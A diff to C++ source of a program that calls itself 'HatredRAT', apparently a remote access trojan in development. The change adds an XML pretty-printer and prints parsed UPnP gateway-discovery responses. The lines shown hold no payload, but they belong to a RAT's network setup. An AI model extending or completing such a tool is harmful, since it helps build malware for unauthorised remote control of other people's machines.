@@ -14,12 +14,42 @@
 #include "./upnp.h"
 #include "./net.h"
 #include "./http.h"
+#include "./xml.h"
 
 #define IPV4_ADDR_STR_LEN 16
 
 #define PROTO_INET 0
 
 using namespace hatred;
+
+void xml_print(xml::xml_node* node, int depth) {
+    printf("%*s<%s%s", depth, "", node->pi ? "?" : "", node->name.c_str());
+    
+    for (auto [k, v] : node->attributes) printf(" %s=\"%s\"", k.c_str(), v.c_str());
+    
+    if (node->pi) {
+        printf("?>\n");
+        return;
+    }
+
+    if (node->leaf) {
+        printf(">%s</%s>\n", node->value.c_str(), node->name.c_str());
+        return;
+    }
+
+    if (node->children.size() == 0) {
+        printf("/>\n");
+        return;
+    } 
+
+    printf(">\n");
+
+    for (auto i : node->children) {
+        xml_print(&i, depth + 1);
+    }
+
+    printf("%*s</%s>\n", depth, "", node->name.c_str());
+}
 
 int main() {
     DPRINTF("HatredRAT version 1.\n"
@@ -63,6 +93,12 @@ int main() {
                             DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                         }
                         DPRINTF("=== body\n%s\n===\n", msg.body.c_str());
+
+                        xml::xml_node* node = xml::xml_parse(msg.body);
+
+                        if (node) {
+                            xml_print(node, 0);
+                        }
                     }
                 } else {
                     DPRINTF("failed to get igd info");
